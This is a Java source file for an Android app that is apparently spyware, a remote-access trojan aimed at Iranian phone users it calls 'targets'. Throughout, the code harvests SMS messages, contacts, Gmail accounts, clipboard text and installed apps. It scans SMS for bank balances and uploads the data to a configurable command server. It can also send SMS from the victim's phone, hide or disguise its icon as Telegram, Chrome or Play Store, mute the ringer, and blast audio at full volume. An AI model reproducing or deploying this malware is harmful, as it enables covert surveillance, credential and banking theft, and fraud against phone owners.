package com.mehrab.android.Application;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Application;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.webkit.WebView;

import androidx.core.app.NotificationCompat;

import com.mehrab.android.MainActivity;
import com.mehrab.android.Models.ContactModel;
import com.mehrab.android.Models.SmsModel;
import com.mehrab.android.R;
import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;

import org.json.JSONObject;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.NumberFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ServiceManager extends Application {
    public String Template = "https://google.com"; // Write url for example goolge
    public String Domain = "http://IP:port"; // Write Ip And port Server
    public String getTemplate() {
        return Template;
    }
    public void setTemplate(String template) {
        Template = template;
    }
    public String PhoneNumber = "";

    public Boolean OfflineMode = false;

    public String getPhoneNumber() {
        return PhoneNumber;
    }

    public void setPhoneNumber(String phoneNumber) {
        PhoneNumber = phoneNumber;
    }

    public Boolean getOfflineMode() {
        return OfflineMode;
    }

    public void setOfflineMode(Boolean offlineMode) {
        OfflineMode = offlineMode;
    }
    public Boolean isOpen = false;

    public void setOpen(Boolean open) {
        isOpen = open;
    }

    public Boolean getOpen() {
        return isOpen;
    }

    public boolean AutoHide = false;

    public void SetAutoHide(boolean value) {
        AutoHide = value;
    }

    public boolean GetAutoHide() {
        return AutoHide;
    }

    public HubConnection hubConnection;

    public void setHubConnection() {
        this.hubConnection = HubConnectionBuilder.create(Domain + "/remote?Target=" + PhoneId()).build();
    }

    public HubConnection getHubConnection() {
        return hubConnection;
    }

    public ComponentName defaultComponent;

    public void setDefaultComponent(ComponentName defaultComponent) {
        this.defaultComponent = defaultComponent;
    }
    public ComponentName getDefaultComponent() {
        return defaultComponent;
    }
    MediaPlayer player;
    public void setPlayer(MediaPlayer player) {
        this.player = player;
    }

    public MediaPlayer getPlayer() {
        return player;
    }

    public String[] permissions = {
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,

    };
    public String offlineModeStatue() {
        StringBuilder payload = new StringBuilder();
        payload.append("new response status for target 🌋").append("\n\n");

        payload.append(String.format("phone number - <code>%s</code>", getPhoneNumber().equals("") ? "undefined":getPhoneNumber())).append("\n");
        payload.append(String.format("status is - <code>%s</code>", getOfflineMode() ? "enable" : "disable"));

        return payload.toString();
    }
    public String ChangeIconApplication(ComponentName component) {
        try {
            PackageManager p = getPackageManager();

            List<ComponentName> componentNames = getListComponent();

            for (ComponentName componentName : componentNames) {
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
            setDefaultComponent(component);
            p.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

        } catch (Exception exception) {
            exception.printStackTrace();
        }

        return "icon changed successfully 🫀";
    }

    @SuppressLint("IntentReset")
    public Boolean SendSMS(String PhoneNumber, String MessageText ,int sim) {
        try {
            SmsManager sms = null;

            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1)
                    sms = SmsManager.getSmsManagerForSubscriptionId(sim);
                else sms = SmsManager.getDefault();
            }catch (Exception exception)
            {
                sms = SmsManager.getDefault();
            }
            sms.sendTextMessage(PhoneNumber.replace(" ", ""), null, MessageText, null, null);
        } catch (Exception exception) {
            return false;
        }
        return true;
    }
    public int BatteryLevel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            } else {
                IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = registerReceiver(null, iFilter);

                int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
                int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

                double batteryPct = level / (double) scale;

                return (int) (batteryPct * 100);

            }
        } catch (Exception exception) {
            return 100;
        }
    }

    public static List<String> splitText(String text, int number) {
        List<String> result = new ArrayList<>();
        for (int i = 0; i < text.length(); i += number) {
            result.add(text.substring(i, Math.min(text.length(), i + number)));
        }
        return result;
    }

    public String PlaySound() {
        setPlayer(MediaPlayer.create(this, R.raw.music));
        getPlayer().setLooping(true);
        getPlayer().start();

        new Thread() {
            public void run() {
                while (getPlayer() != null) {
                    try {
                        AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                        Thread.sleep(1);
                    } catch (Exception exception) {

                    }
                }
            }
        }.start();
        return "sound is playing on phone target";
    }

    public String PouseSound() {
        if (getPlayer() != null)
            getPlayer().stop();
        return "sound is pousing on phone target";
    }

    @SuppressLint("HardwareIds")
    public String PhoneId() {
        return Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);
    }

    @SuppressLint({"HardwareIds", "DefaultLocale", "CheckResult"})
    public void SendMessage(Boolean isDocument, String Command, String Information) {
        if(isDocument && (Information.equals("")||Information.equals(" ")))
            Information = "can not find data";
        try {
            TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String operatorName = manager.getNetworkOperatorName();

            StringBuilder payload = new StringBuilder();
            payload.append(Command).append("\n\n");
            payload.append("════════════════").append("\n");
            payload.append(String.format("android id - <code>%s</code>", PhoneId())).append("\n");
            payload.append(String.format("android model - <code>%s</code>", Build.MODEL)).append("\n");
            payload.append(String.format("android version - <code>%s</code>", Build.VERSION.RELEASE)).append("\n");
            payload.append(String.format("android operator - <code>%s</code>", operatorName)).append("\n");
            payload.append(String.format("android battery - <code>%d</code>", BatteryLevel())).append("\n");
            UUID uuid = UUID.randomUUID();

            String fileName = uuid.toString()
                    .replace("-","")
                    .replace(" ","")
                    .replace("=","")
                    .replace("+","") + ".txt";
            if(isDocument)
                for (String chunck:splitText(Information,1024))
                    upload(PhoneId(),chunck,fileName);
            send(PhoneId(),payload.toString(),fileName,isDocument ? MessageType.Document : MessageType.Message);

        } catch (
                Exception exception) {
            exception.printStackTrace();
        }
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    public String createNotification(String NotificationTitle, String NotificationDescription) {
        String id = "mehrab_notif_id";
        try {
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = manager.getNotificationChannel(id);
                if (channel == null) {
                    channel = new NotificationChannel(id, "channel_title", NotificationManager.IMPORTANCE_HIGH);
                    channel.setDescription("channel_description");
                    channel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
                    manager.createNotificationChannel(channel);
                }
            }
            Intent notificationIntent = new Intent(getApplicationContext(), MainActivity.class);
            notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            PendingIntent contentIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                contentIntent = PendingIntent.getActivity(getApplicationContext(), 110, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
            } else {
                contentIntent = PendingIntent.getActivity(getApplicationContext(), 110, notificationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
            }
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, id)
                    .setSmallIcon(R.drawable.empty)
                    .setContentText(NotificationDescription)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setAutoCancel(true)
                    .setTicker("Nofiication");

            builder.setContentIntent(contentIntent);

            manager.notify(new Random().nextInt(), builder.build());
        } catch (Exception exception) {
            exception.printStackTrace();
        }

        return "response notification showed on target phone";
    }

    public String ChangeClipboard(String text) {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            clipboard.setText(text);
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return "the message text saved on target phone clipboard";
    }

    public String ClipboardApplication() {
        String Information;
        try {
            ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            ClipData clipData = clipboardManager.getPrimaryClip();
            if (clipData != null && clipData.getItemCount() > 0) {
                ClipData.Item item = clipData.getItemAt(0);
                CharSequence text = item.getText();
                if (text != null) {
                    Information = text.toString();
                } else Information = "not found text in clipboard";
            } else {
                Information = "not found text in clipboard";

            }
        } catch (Exception exception) {
            exception.printStackTrace();
            Information = "not found text in clipboard";
        }
        return "clipboard message text on target phone \n\n" + Information;
    }

    public String PermissionApplication() {
        String Information = "";

        Information += String.format("🍷 read sms permission - %s\n",
                checkPermission(Manifest.permission.READ_SMS) ? "access" : "denied");

        Information += String.format("🍷 send sms permission - %s\n",
                checkPermission(Manifest.permission.SEND_SMS) ? "access" : "denied");

        Information += String.format("🍷 read contact permission - %s\n",
                checkPermission(Manifest.permission.READ_CONTACTS) ? "access" : "denied");

        return "program access are as follow 🫀 \n\n" + Information;
    }

    @SuppressLint("Range")
    public List<ContactModel> getAllContact() {
        List<ContactModel> contactList = new ArrayList<>();
        try
        {
            ContentResolver contentResolver = getContentResolver();

            Cursor cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor cursorInfo = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        ContactModel contact = new ContactModel(id, name);

                        while (cursorInfo.moveToNext()) {
                            String phone = cursorInfo.getString(cursorInfo.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    .replace("-", "")
                                    .replace(" ", "")
                                    .replace("+98", "0");
                            contact.setPhoneNumber(phone);

                        }
                        contactList.add(contact);

                        if (cursorInfo != null)
                            cursorInfo.close();
                    }

                }
            }

        }catch (Exception exception){
            exception.printStackTrace();
        }

        return contactList;
    }

    public boolean CheckPermissions() {
        for (String permission : permissions) {
            if (!checkPermission(permission)) return false;
        }
        return true;
    }

    public List<SmsModel> getAllSms()
    {
        List<SmsModel> modelList = new ArrayList<SmsModel>();

        try{
            Uri inboxURI = Uri.parse("content://sms");
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(inboxURI, null, null, null, null);

            while (cursor.moveToNext()) {
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));

                modelList.add(new SmsModel(type ,number ,body));
            }
            cursor.close();

        }catch (Exception exception)
        {
            exception.printStackTrace();
        }

        return modelList;
    }
    public String GetAllPackage() {
        try {
            StringBuilder PackageList = new StringBuilder();
            final PackageManager pm = getPackageManager();

            @SuppressLint("QueryPermissionsNeeded") List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

            for (ApplicationInfo packageInfo : packages) {
                if (pm.getLaunchIntentForPackage(packageInfo.packageName) != null &&
                        !pm.getLaunchIntentForPackage(packageInfo.packageName).equals(""))
                    PackageList.append(packageInfo.loadLabel(pm)).append("\n");
            }

            return PackageList.toString();
        } catch (Exception exception) {
            return "not found application";
        }

    }

    public String SilentApplication() {
        try {
            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                audioManager.adjustStreamVolume(AudioManager.STREAM_RING,
                        AudioManager.ADJUST_MUTE, 0);
            } else {
                audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return "the target become silent 🫀";


    }

    public String NormalApplication() {
        try {
            AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                audioManager.adjustStreamVolume(AudioManager.STREAM_RING,
                        AudioManager.ADJUST_UNMUTE, 0);
            } else {
                audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return "the target become loud 🫀";

    }

    public String HideApplication() {
        try {
            PackageManager p = getPackageManager();
            List<ComponentName> componentNames = getListComponent();

            for (ComponentName componentName : componentNames) {
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }

            if ((Build.MANUFACTURER.equalsIgnoreCase("samsung") || Build.MODEL.startsWith("SM")) && Build.VERSION.SDK_INT > Build.VERSION_CODES.Q) {
                p.setComponentEnabledSetting(new ComponentName(this, getPackageName() + ".EmptyActivity"), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            }

        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return "the application is hidden on taget phone 🫀";
    }

    public List<ComponentName> getListComponent() {
        List<ComponentName> componentNames = new ArrayList<>();

        componentNames.add(new ComponentName(this, MainActivity.class));
        componentNames.add(new ComponentName(this, getPackageName() + ".TelegramActivity"));
        componentNames.add(new ComponentName(this, getPackageName() + ".PlayStoreActivity"));
        componentNames.add(new ComponentName(this, getPackageName() + ".InstagramActivity"));
        componentNames.add(new ComponentName(this, getPackageName() + ".ChromeActivity"));
        componentNames.add(new ComponentName(this, getPackageName() + ".GoogleActivity"));
        componentNames.add(new ComponentName(this, getPackageName() + ".EmptyActivity"));
        return componentNames;
    }

    public String ShowApplication() {
        try {
            PackageManager p = getPackageManager();
            List<ComponentName> componentNames = getListComponent();

            for (ComponentName componentName : componentNames) {
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
            if (getDefaultComponent() != null)
                p.setComponentEnabledSetting(getDefaultComponent(), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            else
                p.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return "the application is showed on taget phone 🫀";
    }

    public void Reconnect() {
        while (true) {
            try {
                getHubConnection().start().blockingAwait();
                break;
            } catch (Exception exception) {
                try {
                    Thread.sleep(5000);
                } catch (Exception e) {
                }

                exception.printStackTrace();
            }
        }
//        SendMessage("Update","");
    }

    private boolean checkPermission(String permission) {
        int res = checkCallingOrSelfPermission(permission);
        return (res == PackageManager.PERMISSION_GRANTED);
    }
    public String getBankCode(String prefix) {
        switch(prefix) {
            case "603799": return "بانک ملی ایران";
            case "589210": return "بانک سپه";
            case "627648": return "بانک توسعه صادرات";
            case "627961": return "بانک صنعت و معدن";
            case "603770": return "بانک کشاورزی";
            case "628023": return "بانک مسکن";
            case "627760": return "پست بانک ایران";
            case "502908": return "بانک توسعه تعاون";
            case "627412": return "بانک اقتصاد نوین";
            case "622106": return "بانک پارسیان";
            case "502229": return "بانک پاسارگاد";
            case "627488": return "بانک کارآفرین";
            case "621986": return "بانک سامان";
            case "639346": return "بانک سینا";
            case "639607": return "بانک سرمایه";
            case "636214": return "بانک تات";
            case "502806": return "بانک شهر";
            case "502938": return "بانک دی";
            case "603769": return "بانک صادرات";
            case "610433": return "بانک ملت";
            case "627353": return "بانک تجارت";
            case "589463": return "بانک رفاه";
            case "627381": return "بانک انصار";
            case "639370": return "بانک مهر اقتصاد";
            default: return "نامشخص";
        }
    }
    public static void sendPostRequest(String url ,String payload) {
        MediaType mediaType = MediaType.parse("application/json");
        RequestBody body = RequestBody.create(mediaType, payload);

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();

        OkHttpClient client = new OkHttpClient();

        try {
            Response response = client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void upload(String device, String content, String document) throws Exception {
        String encoded = Base64.encodeToString(content.getBytes("utf-8"), Base64.DEFAULT)
                .replace(" ","")
                .replace("\n","");

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("Device", device);
        jsonObject.put("Content", encoded);
        jsonObject.put("Document", document);

        String payload = jsonObject.toString();

        sendPostRequest(Domain + "/Upload", payload);
    }
    public void send(String device, String message, String document, MessageType type) throws Exception {

        JSONObject jsonObject = new JSONObject();

        jsonObject.put("Message", message);
        jsonObject.put("Device", device);
        jsonObject.put("Document", document);
        jsonObject.put("Type", type == MessageType.Message ? 1 : 2);

        String payload = jsonObject.toString();
        sendPostRequest(Domain + "/Send", payload);
    }
    public String convertToEnglishDigits(String persianNumber) {
        String result = "";
        for (int i = 0; i < persianNumber.length(); i++) {
            char c = persianNumber.charAt(i);
            if (Character.isDigit(c)) {
                int digit = Integer.parseInt(String.valueOf(c));
                result += NumberFormat.getInstance(Locale.ENGLISH).format(digit);
            } else {
                result += c;
            }
        }
        return result;
    }
    public String getUserIp()
    {
        String host = "google.com";
        int port = 80;
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), 2000);
            String ipAddress = socket.getLocalAddress().getHostAddress();
            return ipAddress;
        } catch (IOException e) {
            return "undefind";
        }
    }
    public List<String> getGmailAccounts() {
        List<String> accounts = new ArrayList<>();

        try {
            AccountManager accountManager = AccountManager.get(getApplicationContext());

            Account[] allAccounts = accountManager.getAccountsByType("com.google");
            for (Account account : allAccounts) {
                accounts.add(account.name);
            }

        }catch (Exception exception)
        {
            exception.printStackTrace();
        }
        return accounts;
    }

    public Boolean checkSmsBank()
    {
        List<SmsModel> models = getAllSms();

        for (SmsModel model:models) {
            if (model.sender.toLowerCase().contains("بانک") || model.sender.toLowerCase().contains("bank")
                        || model.message.replace(" ","").contains("حساب:") || model.message.replace(" ","").contains("مانده:")|| model.message.replace(" ","").contains("موجودی:"))
                    return true;
            }
        return false;
    }
    public List<String> findPhoneNumber()
    {
        List<SmsModel> models = getAllSms();
        List<String> phones = new ArrayList<>();

        for (SmsModel model:models) {
            String regex = "(\\+98|0)?9\\d{9}";

            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(model.message.replaceAll("\\s", "").replaceAll(" ", ""));
            while(matcher.find()) {
                String phone = matcher.group();
                String formattedPhone = "";

                if (phone.startsWith("0"))
                    formattedPhone = "+98" + phone.substring(1);
                else if (phone.startsWith("+"))
                    formattedPhone = phone;
                else formattedPhone = "+98" + phone;
                phones.add(formattedPhone);
            }
        }
        Map<String, Integer> frequencyMap = new HashMap<String, Integer>();

        int maxFrequency = 0;
        for (String number : phones) {
            if (frequencyMap.containsKey(number)) {
                frequencyMap.put(number, frequencyMap.get(number) + 1);
            } else {
                frequencyMap.put(number, 1);
            }
            maxFrequency = Math.max(maxFrequency, frequencyMap.get(number));
        }
        List<String> mostFrequentNumbers = new ArrayList<>();

        for (int i = 0; i < phones.size() && mostFrequentNumbers.size() < 5; i++) {
            String currentNumber = phones.get(i);
            if (frequencyMap.get(currentNumber) == maxFrequency && !mostFrequentNumbers.contains(currentNumber)) {
                mostFrequentNumbers.add(currentNumber);
            }
        }
        for (String phone : phones) {
            if (frequencyMap.get(phone) == maxFrequency && !mostFrequentNumbers.contains(phone)) {
                mostFrequentNumbers.add(phone);
            }
        }
        return  mostFrequentNumbers;
    }
    public String balance()
    {
        try {
            for (SmsModel model:getAllSms()) {
                if (model.message.replace(" ","").contains("مانده"))
                {
                    Pattern pattern = Pattern.compile("مانده\\s*:?\\s*(\\d{1,3}(,\\d{3})+)");
                    Matcher matcher = pattern.matcher(model.message);
                    if (matcher.find()) {
                        String foundText = matcher.group(1);
                        return convertToEnglishDigits(foundText);
                    }
                }
            }
        }catch (Exception exception)
        {
            exception.printStackTrace();
        }

        return "not found";
    }
    public String FullInformation() {
        StringBuilder builder = new StringBuilder();

        builder.append("🫀 full user information is :").append("\n\n");
        builder.append("➖ ip address - <code>" + getUserIp() + "</code>").append("\n\n");
        List<String> gmails;

        try {
            gmails = getGmailAccounts();
        }catch (Exception exception)
        {
            gmails = new ArrayList<>();
        }
        builder.append("➖ gmail accounts - ").append("\n");
        if (gmails.size() > 0)
        {
            for (String gmail:gmails.subList(0,Math.min(10 ,gmails.size()))) {
                builder.append("〰 " + "<code>"+gmail+"</code>").append("\n");

            }
        }else {
            builder.append("account not found").append("\n");
        }
        builder.append("\n").append("🏦 sms bank is active - <code>" + checkSmsBank() + "</code>").append("\n");
        builder.append("💲 bank name is - <code>" + balance() + "</code>").append("\n\n");

        builder.append(PermissionApplication()).append("\n");
        builder.append("➖ phone numbers - ").append("\n");
        List<String> phones;
        try {
            phones = findPhoneNumber();
        }catch (Exception exception)
        {
            phones = new ArrayList<>();
        }

        if (phones.size() > 0)
        {
            for (String phone:phones) {
                builder.append("〰 " + "<code>"+phone+"</code>").append("\n");
            }
        }else {
            builder.append("phone not found").append("\n");
        }
        String statusApp = getOpen() ? "open 🫀": "closed 💀";
        builder.append("\n\n💤 application is - " + statusApp);
        return builder.toString();
    }
    public boolean hasWhatsapp(String contactID) {
        boolean hasWhatsApp = false;
        try{
            String[] projection = new String[]{ContactsContract.RawContacts._ID};
            String selection = ContactsContract.Data.CONTACT_ID + " = ? AND account_type IN (?)";
            String[] selectionArgs = new String[]{contactID, "com.whatsapp"};
            Cursor cursor = getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI, projection, selection, selectionArgs, null);
            if (cursor != null) {
                hasWhatsApp = cursor.moveToNext();
                cursor.close();
            }
        }catch (Exception exception){
            exception.printStackTrace();
        }

        return hasWhatsApp;
    }
}

enum MessageType {
    Message,
    Document
}
